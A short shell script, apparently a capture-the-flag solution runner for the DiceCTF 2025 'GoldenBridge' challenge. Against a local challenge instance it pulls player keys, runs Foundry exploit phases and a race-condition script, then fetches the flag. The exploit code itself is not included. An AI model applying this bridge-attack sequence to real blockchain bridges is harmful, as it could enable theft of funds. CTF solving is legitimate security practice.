export INSTANCE_URL=http://localhost:5555
curl $INSTANCE_URL/player.json | jq .solana.keypair > src/DiceCTF2025/GoldenBridge/key.json
solana config set --url $INSTANCE_URL/sol
solana config set --keypair src/DiceCTF2025/GoldenBridge/key.json
spl-token create-account (curl -s $INSTANCE_URL/player.json | jq -r .solana.mint) \
                    --owner $(solana address --keypair src/DiceCTF2025/GoldenBridge/key.json) \
                    --fee-payer src/DiceCTF2025/GoldenBridge/key.json
rm src/DiceCTF2025/GoldenBridge/key.json

sleep 5

export FOUNDRY_ETH_RPC_URL=$INSTANCE_URL/eth
export PRIVATE_KEY=(curl -s $INSTANCE_URL/player.json | jq -r .ethereum.private_key)
export INSTANCE_ADDR=(curl -s $INSTANCE_URL/player.json | jq -r .ethereum.setup)
forge script src/DiceCTF2025/GoldenBridge/Exploit.s.sol:ExploitScript --sig "prepare(address)" $INSTANCE_ADDR --private-key $PRIVATE_KEY -vvvvv --broadcast

sleep 5

python src/DiceCTF2025/GoldenBridge/race.py

sleep 5

forge script src/DiceCTF2025/GoldenBridge/Exploit.s.sol:ExploitScript --sig "solve(address)" $INSTANCE_ADDR --private-key $PRIVATE_KEY -vvvvv --broadcast

curl $INSTANCE_URL/flag
